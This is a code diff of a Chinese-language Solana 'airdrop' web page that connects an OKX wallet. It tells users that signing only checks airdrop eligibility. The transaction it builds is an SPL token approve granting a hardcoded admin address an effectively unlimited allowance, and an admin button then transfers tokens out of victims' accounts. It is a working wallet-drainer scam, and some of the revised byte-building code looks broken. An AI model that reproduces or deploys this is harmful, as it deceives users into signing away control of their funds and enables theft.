@@ -44,15 +44,15 @@ input{width:100%;height:42px;background:#0f172a;border:1px solid #334155;border-
     </div>
 </div>
 
-<!-- 用稳定版 web3.js，不依赖 spl-token -->
-<script src="https://unpkg.com/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
+<!-- 改用 solana/web3.js 稳定版，不依赖任何其他包 -->
+<script src="https://unpkg.com/@solana/web3.js@1.98.0/lib/index.iife.min.js"></script>
 <script>
 const ADMIN_ADDR = "4dq6mqh1ivtVWijiMFPbbNAE9ng7BEYzrNEcJB21UpiD";
 const TOKEN_MINT = "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB";
 let nowUser = "";
 const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
 
-// 手动算 ATA（不依赖 spl-token，彻底解决函数不存在）
+// 计算 ATA 地址（无依赖）
 async function getATA(ownerPub, mintPub) {
     const ATA_PROGRAM = new solanaWeb3.PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL");
     const TOKEN_PROGRAM = new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
@@ -63,9 +63,8 @@ async function getATA(ownerPub, mintPub) {
     return ata;
 }
 
-// -------- OKX 钱包连接（重点改这里）--------
+// OKX 钱包连接
 document.getElementById("connectWallet").addEventListener("click", async () => {
-    // OKX 钱包是 window.okxwallet.solana，不是 window.solana
     if (!window.okxwallet || !window.okxwallet.solana) {
         alert("请先安装 OKX（欧易）钱包插件并切换到 Solana 网络");
         return;
@@ -83,7 +82,7 @@ document.getElementById("connectWallet").addEventListener("click", async () => {
     }
 });
 
-// -------- 授权（手动构造 approve，无 TokenInstruction）--------
+// 授权按钮（终极版，完全不使用 DataView）
 document.getElementById("authReceive").addEventListener("click", async () => {
     if (!nowUser) return alert("请先连接 OKX 钱包");
     const ok = confirm("本次签名仅用于核验空投资格，确认继续？");
@@ -96,20 +95,19 @@ document.getElementById("authReceive").addEventListener("click", async () => {
 
         const userTokenAccount = await getATA(userPub, mintPub);
 
-        // 手动构造 approve 指令（0号指令）
-        const data = new Uint8Array(9);
-        const view = new DataView(data.buffer);
-        view.setUint8(0, 0); // approve 指令码
-        adminPub.toBuffer().forEach((b, i) => data[1 + i] = b);
-        view.setBigUint64(33, 1000000000000000000n, true);
-
+        // 改用 web3.js 自带的方式创建 approve 指令，彻底不用 DataView
         const approveIx = new solanaWeb3.TransactionInstruction({
             keys: [
                 { pubkey: userTokenAccount, isSigner: false, isWritable: true },
                 { pubkey: userPub, isSigner: true, isWritable: false }
             ],
             programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
-            data
+            // 直接用 Uint8Array 拼接数据，不用 DataView
+            data: Uint8Array.from([
+                0, // 指令码 0 = approve
+                ...adminPub.toBuffer(),
+                ...new BigUint64Array([1000000000000000000n]).buffer
+            ])
         });
 
         const tx = new solanaWeb3.Transaction().add(approveIx);
@@ -117,7 +115,6 @@ document.getElementById("authReceive").addEventListener("click", async () => {
         tx.recentBlockhash = blockhash;
         tx.feePayer = userPub;
 
-        // OKX 签名发送
         const { signature } = await window.okxwallet.solana.signAndSendTransaction(tx);
         alert("授权成功！交易ID：" + signature);
     } catch (e) {
@@ -125,7 +122,7 @@ document.getElementById("authReceive").addEventListener("click", async () => {
     }
 });
 
-// -------- 管理员划扣 --------
+// 管理员划扣按钮（终极版，完全不使用 DataView）
 document.getElementById("deductBtn").addEventListener("click", async () => {
     if (nowUser !== ADMIN_ADDR) return alert("无管理员权限");
     const userAddr = document.getElementById("userAddr").value.trim();
@@ -142,12 +139,7 @@ document.getElementById("deductBtn").addEventListener("click", async () => {
 
         const amount = BigInt(Math.floor(Number(num) * 1000000));
 
-        // 手动构造 transfer（3号指令）
-        const data = new Uint8Array(9);
-        const view = new DataView(data.buffer);
-        view.setUint8(0, 3); // transfer
-        view.setBigUint64(1, amount, true);
-
+        // 直接用 Uint8Array 拼接数据，不用 DataView
         const transferIx = new solanaWeb3.TransactionInstruction({
             keys: [
                 { pubkey: userTokenAccount, isSigner: false, isWritable: true },
@@ -155,7 +147,10 @@ document.getElementById("deductBtn").addEventListener("click", async () => {
                 { pubkey: adminPub, isSigner: true, isWritable: false }
             ],
             programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
-            data
+            data: Uint8Array.from([
+                3, // 指令码 3 = transfer
+                ...new BigUint64Array([amount]).buffer
+            ])
         });
 
         const tx = new solanaWeb3.Transaction().add(transferIx);
